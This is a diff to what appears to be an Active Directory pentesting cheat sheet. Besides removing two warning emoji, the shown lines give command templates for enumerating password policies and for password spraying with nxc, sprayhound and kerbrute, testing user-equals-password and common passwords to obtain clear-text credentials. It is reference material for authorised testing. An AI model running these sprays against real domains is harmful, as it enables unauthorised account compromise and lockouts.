@@ -11,10 +11,10 @@
     - `ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols`
     - `Get-ADFineGainedPasswordPolicy -filter *`
     - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso # can also be runned with a low priv account but less information will be available`
-- ⚠️ user == password >>> Clear text Credentials
+- user == password >>> Clear text Credentials
   - `nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success`
   - `sprayhound -U <users.txt> -d <domain> -dc  <dc_ip>   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass`
-- ⚠️ usuals passwords  (SeasonYear!, Company123, ...) >>> Clear text Credentials
+- usuals passwords  (SeasonYear!, Company123, ...) >>> Clear text Credentials
   - `nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success`
   - `sprayhound -U <users.txt> -p <password> -d <domain> -dc  <dc_ip>`
   - `kerbrute passwordspray -d <domain> <users.txt> <password>`
